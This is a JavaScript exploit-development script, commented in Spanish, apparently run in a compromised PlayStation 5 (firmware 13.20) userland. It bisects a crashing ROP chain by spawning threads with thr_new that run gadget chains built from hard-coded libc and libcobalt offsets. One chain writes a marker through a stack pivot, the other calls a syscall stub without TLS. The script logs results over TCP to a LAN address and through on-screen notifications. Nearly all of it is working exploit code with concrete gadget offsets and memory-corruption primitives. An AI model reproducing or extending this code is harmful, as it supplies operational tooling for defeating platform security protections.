// 2026-08-27 rop_bisect_1320: PS5 13.20 BISECCION del fallo de race_rop_1320 (muerte entre JOIN pre y FASE A). Sospechosos: (a) entrada hilo raw + cadena pop_rsp, (b) STUB libc+0x19E34F con fs=0 (TLS nulo).
// TEST1 (SIN STUB, safe): bucle pop_rax(MARK)->pop_rdi(buf1)->mov[rdi],rax->loopback; MARK en buf1 => entrada+gadgets OK. TEST2: getpid (rax=20 Y rdi=20, cinturon p/ 2 semanticas STUB) via STUB sin TLS, rax->buf2; !=0 => STUB ok sin TLS.
// Canal anti-perdida logs: W() TCP 192.168.1.67:8081 (igual race) + send_notification por test (pantalla). Gadgets solo offsets ROP_1320; cero lectura modulos; polls acotados; no munmap stacks.
(() => {
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x);const WB=malloc(512);let sock=-1n;
const N=(s)=>{try{send_notification(s);}catch(e){}};
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
const STK=0x400000n,MARK=0x4141414141414141n;let pid=0n;const g={};let okb=false;
if(typeof libcobalt_base!=="undefined"&&typeof libc_base!=="undefined"&&B(libcobalt_base)!==0n&&B(libc_base)!==0n){const c=B(libcobalt_base),L=B(libc_base);
g.pop_rsp=c+0x6f7c7n;g.pop_rax=c+0x35942n;g.pop_rdi=c+0x54bn;g.pop_rsi=c+0x26a5n;g.pop_rdx=c+0x81300n;g.pop_rcx=c+0x25e9n;g.pop_r8=c+0x35941n;g.pop_r9=c+0x3d9132n;g.mov_qword_rdi_rax=c+0x6fcecn;g.STUB=L+0x19E348n+7n;okb=true;}
// spawn: top-down, [top-8]=A, ch[N-1]=A (loopback, como race ch[16]=A). tf_rip=pop_rsp, tf_rsp=top-8; tls=0/fs=0: eso se prueba.
const spawnLoop=(ch)=>{
const base=I(syscall(SYSCALL.mmap,0n,STK,3n,MAP_PRIVATE|MAP_ANONYMOUS,B(-1),0n));
if(base<=0n){W("[bisect] mmap stack ERR: "+get_error_string());return null;}
const top=base+STK,N2=ch.length,A=top-8n*B(N2);ch[N2-1]=A;
for(let i=0;i<N2;i++)write64(A+8n*B(i),ch[i]);write64(top-8n,A);
const tp=malloc(0x68);for(let i=0;i<0x68;i+=8)write64(tp+BigInt(i),0n);const ct=malloc(8);write64(ct,0n);
write64(tp,g.pop_rsp);write64(tp+8n,0n);write64(tp+0x10n,base);write64(tp+0x18n,STK);write64(tp+0x30n,ct);
const tr=I(syscall(SYSCALL.thr_new,tp,B(0x68)));
if(tr<0n){W("[bisect] thr_new ERR: "+get_error_string());syscall(SYSCALL.munmap,base,STK);return null;}
const tid=B(read32(ct));if(tid===0n){W("[bisect] tid=0");syscall(SYSCALL.munmap,base,STK);return null;}
return{base:base,A:A,tid:tid};};
// poll acotado: 50000 yields, read64 buffer PROPIO cada 32; primer !=0 o 0.
const poll=(buf)=>{for(let i=0;i<50000;i++){syscall(SYSCALL.sched_yield);if(i%32===0){const v=B(read64(buf));if(v!==0n)return v;}}return B(read64(buf));};
try{
try{pid=I(syscall(SYSCALL.getpid));}catch(e){}
W("[bisect] pid="+toHex(pid)+" cob="+(okb?toHex(B(libcobalt_base)):"NO")+" libc="+(okb?toHex(B(libc_base)):"NO")+" STUB="+(okb?toHex(g.STUB):"?"));
if(!okb){W("[bisect] ABORT: sin bases");N("[bisect] abort no-bases");return;}
let r1="EX",r2="no-alcanzado";
// TEST 1: entrada+gadgets sin STUB
const buf1=malloc(8);write64(buf1,0n);
const c1=[g.pop_rax,MARK,g.pop_rdi,buf1,g.mov_qword_rdi_rax,g.pop_rsp,0n]; // 7q; [6]=A lo fija spawnLoop
const tA=spawnLoop(c1);
if(!tA)r1="spawn-fallo";else{
W("[bisect] T1 tid="+tA.tid+" bucle marker->buf1 A="+toHex(tA.A));
const v1=poll(buf1);
if(v1===MARK){r1="OK";W("[bisect] TEST1 OK: entrada+gadgets funcionan (marker en buffer)");}
else if(v1!==0n){r1="FALLO";W("[bisect] TEST1 FALLO: buf1="+toHex(v1)+" inesperado (crash previo?)");}
else{r1="FALLO";W("[bisect] TEST1 FALLO: hilo no escribio el marker (entrada o gadgets mal)");}
N("[bisect] T1="+r1);
// Retirada T1: sin STUB no hay hot-patch; thr_kill2(,9) mataria el PROCESO. Hilo DEJADO vivo (bucle inocuo); NO munmap su stack. T2 usa otro thread/stack.
}
// TEST 2: STUB sin TLS. getpid=20=0x14 (global.js). rax=20 Y rdi=20: cinturon p/ 2 semanticas del STUB.
const buf2=malloc(8);write64(buf2,0n);
const c2=[g.pop_rax,20n,g.pop_rdi,20n,g.pop_rsi,0n,g.pop_rdx,0n,g.pop_rcx,0n,g.pop_r8,0n,g.pop_r9,0n,g.STUB,g.pop_rdi,buf2,g.mov_qword_rdi_rax,g.pop_rsp,0n]; // 20q; tras STUB rax->buf2 via pop_rdi+mov, loopback
if(r1!=="OK")W("[bisect] T1 no ok; lanzo T2 igual");
N("[bisect] T1="+r1); // T1 en pantalla antes de lanzar T2
const tB=spawnLoop(c2);
if(!tB)r2="spawn-fallo";else{
W("[bisect] T2 tid="+tB.tid+" bucle getpid(20) via STUB->buf2 A="+toHex(tB.A));
const v2=poll(buf2);
if(v2!==0n){r2="OK";W("[bisect] TEST2 OK: STUB funciona sin TLS, pid_leido="+toHex(v2)+" (getpid JS="+toHex(pid)+", match="+(v2===pid)+")");}
else{r2="FALLO";W("[bisect] TEST2 FALLO: STUB colgado o proceso muerto (fs=0/TLS)");}
N("[bisect] T2="+r2);}
const resum="[bisect] RESUMEN: T1="+r1+" T2="+r2+" (T1 OK + T2 FALLO = STUB necesita TLS; T1 FALLO = entrada/cadena mal)";W(resum);
N("[bisect] T1="+r1+" T2="+r2);
// bucle resumen c/~3s x40 = ~2min (40x3000 sched_yield acotados); <60 chars p/ banner
const nres=("[bisect] T1="+r1+" T2="+r2).slice(0,59);
for(let i=0;i<40;i++){try{send_notification(nres);}catch(e){}for(let j=0;j<3000;j++)syscall(SYSCALL.sched_yield);}
// reenvio TCP: socket+connect misma sockaddr x3 intentos; W(resum); cierra entre intentos
for(let a=0;a<3;a++){sock=-1n;try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock>=0n){const sa2=malloc(16);write8(sa2,16);write8(sa2+1n,2);write16(sa2+2n,0x911Fn);write32(sa2+4n,0x4301A8C0n);write64(sa2+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa2,16n))===0n)W(resum);syscall(SYSCALL.close,sock);sock=-1n;}}catch(e){if(sock>=0n){try{syscall(SYSCALL.close,sock);}catch(e2){}sock=-1n;}}}
}catch(e){W("[bisect] EX fatal: "+e);N("[bisect] abort EX");}
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
